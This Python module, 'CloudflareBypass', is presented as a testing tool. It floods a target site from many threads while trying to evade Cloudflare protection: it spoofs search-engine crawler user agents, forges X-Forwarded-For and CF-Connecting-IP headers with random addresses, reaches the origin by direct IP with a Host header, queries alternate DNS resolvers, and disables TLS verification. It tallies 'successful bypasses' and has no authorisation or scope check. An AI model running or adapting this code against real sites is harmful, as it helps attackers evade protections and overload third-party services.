#!/usr/bin/env python3
"""
Cloudflare Bypass Testing Module
Tests various techniques to bypass Cloudflare protection
"""

import requests
import threading
import time
import random
import socket
import ssl
from colorama import Fore, Style
from urllib.parse import urlparse

class CloudflareBypass:
    def __init__(self, target, port, threads=10, duration=60, verbose=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.verbose = verbose
        self.running = False
        self.requests_sent = 0
        self.successful_bypasses = 0
        self.failed_attempts = 0
        
        # Cloudflare bypass techniques
        self.bypass_techniques = [
            'user_agent_rotation',
            'header_manipulation',
            'ip_rotation',
            'ssl_verification_disable',
            'direct_ip_access',
            'dns_manipulation'
        ]
        
        # User agents that might bypass Cloudflare
        self.bypass_user_agents = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
            'Mozilla/5.0 (compatible; FacebookExternalHit/1.1; +http://www.facebook.com/externalhit_uatext.php)',
            'Mozilla/5.0 (compatible; Twitterbot/1.0)',
            'Mozilla/5.0 (compatible; LinkedInBot/1.0)',
            'Mozilla/5.0 (compatible; WhatsApp/2.0)'
        ]
        
        # Headers that might help bypass Cloudflare
        self.bypass_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
            'X-Forwarded-For': None,  # Will be set dynamically
            'X-Real-IP': None,        # Will be set dynamically
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Host': None, # Will be set dynamically
            'CF-Connecting-IP': None, # Will be set dynamically
        }

    def generate_random_ip(self):
        """Generate a random IP address"""
        return f"{random.randint(1, 223)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    def user_agent_rotation_test(self):
        """Test with rotating user agents"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.bypass_user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            })
            
            protocol = 'https' if self.port == 443 else 'http'
            url = f"{protocol}://{self.target}:{self.port}/"
            
            response = session.get(url, timeout=10, verify=False)
            self.requests_sent += 1
            
            if response.status_code == 200 and 'cloudflare' not in response.text.lower():
                self.successful_bypasses += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] User agent rotation successful - Status: {response.status_code}{Style.RESET_ALL}")
            else:
                self.failed_attempts += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] User agent rotation failed - Status: {response.status_code}{Style.RESET_ALL}")
                    
        except Exception as e:
            self.requests_sent += 1
            self.failed_attempts += 1
            if self.verbose:
                print(f"{Fore.RED}[-] User agent rotation error: {e}{Style.RESET_ALL}")

    def header_manipulation_test(self):
        """Test with manipulated headers"""
        try:
            session = requests.Session()
            
            # Set headers that might bypass Cloudflare
            headers = self.bypass_headers.copy()
            headers['User-Agent'] = random.choice(self.bypass_user_agents)
            headers['X-Forwarded-For'] = self.generate_random_ip()
            headers['X-Real-IP'] = self.generate_random_ip()
            headers['X-Forwarded-Host'] = self.target
            headers['CF-Connecting-IP'] = self.generate_random_ip()
            
            session.headers.update(headers)
            
            protocol = 'https' if self.port == 443 else 'http'
            url = f"{protocol}://{self.target}:{self.port}/"
            
            response = session.get(url, timeout=10, verify=False)
            self.requests_sent += 1
            
            if response.status_code == 200 and 'cloudflare' not in response.text.lower():
                self.successful_bypasses += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Header manipulation successful - Status: {response.status_code}{Style.RESET_ALL}")
            else:
                self.failed_attempts += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] Header manipulation failed - Status: {response.status_code}{Style.RESET_ALL}")
                    
        except Exception as e:
            self.requests_sent += 1
            self.failed_attempts += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Header manipulation error: {e}{Style.RESET_ALL}")

    def direct_ip_access_test(self):
        """Test direct IP access"""
        try:
            # Try to resolve the domain to IP
            try:
                ip = socket.gethostbyname(self.target)
            except:
                ip = self.target
            
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.bypass_user_agents),
                'Host': self.target,  # Important: set Host header to original domain
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            
            protocol = 'https' if self.port == 443 else 'http'
            url = f"{protocol}://{ip}:{self.port}/"
            
            response = session.get(url, timeout=10, verify=False)
            self.requests_sent += 1
            
            if response.status_code == 200:
                self.successful_bypasses += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Direct IP access successful - IP: {ip} - Status: {response.status_code}{Style.RESET_ALL}")
            else:
                self.failed_attempts += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] Direct IP access failed - IP: {ip} - Status: {response.status_code}{Style.RESET_ALL}")
                    
        except Exception as e:
            self.requests_sent += 1
            self.failed_attempts += 1
            if self.verbose:
                print(f"{Fore.RED}[-] Direct IP access error: {e}{Style.RESET_ALL}")

    def ssl_verification_disable_test(self):
        """Test with SSL verification disabled"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.bypass_user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            
            # Disable SSL verification and warnings
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            url = f"https://{self.target}:{self.port}/"
            
            response = session.get(url, timeout=10, verify=False, allow_redirects=True)
            self.requests_sent += 1
            
            if response.status_code == 200:
                self.successful_bypasses += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] SSL verification disable successful - Status: {response.status_code}{Style.RESET_ALL}")
            else:
                self.failed_attempts += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] SSL verification disable failed - Status: {response.status_code}{Style.RESET_ALL}")
                    
        except Exception as e:
            self.requests_sent += 1
            self.failed_attempts += 1
            if self.verbose:
                print(f"{Fore.RED}[-] SSL verification disable error: {e}{Style.RESET_ALL}")

    def dns_manipulation_test(self):
        """Test DNS manipulation techniques"""
        try:
            # Try different DNS servers
            dns_servers = ['8.8.8.8', '1.1.1.1', '208.67.222.222', '9.9.9.9']
            
            for dns_server in dns_servers:
                if not self.running:
                    break
                    
                try:
                    # Create a custom resolver
                    import dns.resolver
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [dns_server]
                    
                    # Try to resolve the domain
                    answers = resolver.resolve(self.target, 'A')
                    ip = str(answers[0])
                    
                    # Test the resolved IP
                    session = requests.Session()
                    session.headers.update({
                        'User-Agent': random.choice(self.bypass_user_agents),
                        'Host': self.target,
                    })
                    
                    protocol = 'https' if self.port == 443 else 'http'
                    url = f"{protocol}://{ip}:{self.port}/"
                    
                    response = session.get(url, timeout=10, verify=False)
                    self.requests_sent += 1
                    
                    if response.status_code == 200:
                        self.successful_bypasses += 1
                        if self.verbose:
                            print(f"{Fore.GREEN}[+] DNS manipulation successful - DNS: {dns_server} - IP: {ip} - Status: {response.status_code}{Style.RESET_ALL}")
                        break
                    else:
                        self.failed_attempts += 1
                        if self.verbose:
                            print(f"{Fore.YELLOW}[!] DNS manipulation failed - DNS: {dns_server} - IP: {ip} - Status: {response.status_code}{Style.RESET_ALL}")
                            
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[-] DNS manipulation error with {dns_server}: {e}{Style.RESET_ALL}")
                        
        except ImportError:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] DNS manipulation requires dnspython library{Style.RESET_ALL}")
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] DNS manipulation error: {e}{Style.RESET_ALL}")

    def worker(self):
        """Worker thread function"""
        while self.running:
            # Randomly choose a bypass technique
            technique = random.choice(self.bypass_techniques)
            
            if technique == 'user_agent_rotation':
                self.user_agent_rotation_test()
            elif technique == 'header_manipulation':
                self.header_manipulation_test()
            elif technique == 'direct_ip_access':
                self.direct_ip_access_test()
            elif technique == 'ssl_verification_disable':
                self.ssl_verification_disable_test()
            elif technique == 'dns_manipulation':
                self.dns_manipulation_test()

    def run_tests(self):
        """Run all Cloudflare bypass tests"""
        print(f"{Fore.CYAN}[*] Starting Cloudflare bypass tests against {self.target}:{self.port}{Style.RESET_ALL}")
        
        self.running = True
        start_time = time.time()
        
        # Start worker threads
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                print(f"\r{Fore.YELLOW}[*] Progress: {elapsed:.1f}s/{self.duration}s | "
                      f"Requests: {self.requests_sent} | "
                      f"Successful bypasses: {self.successful_bypasses} | "
                      f"Failed attempts: {self.failed_attempts} | "
                      f"Remaining: {remaining:.1f}s{Style.RESET_ALL}", end="")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted{Style.RESET_ALL}")
        
        # Stop all threads
        self.running = False
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=1)
        
        # Print final results
        print(f"\n{Fore.GREEN}[+] Cloudflare bypass test completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total requests: {self.requests_sent}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful bypasses: {self.successful_bypasses}{Style.RESET_ALL}")
        print(f"{Fore.RED}Failed attempts: {self.failed_attempts}{Style.RESET_ALL}")
        
        if self.requests_sent > 0:
            bypass_rate = (self.successful_bypasses / self.requests_sent) * 100
            print(f"{Fore.YELLOW}Bypass success rate: {bypass_rate:.1f}%{Style.RESET_ALL}") 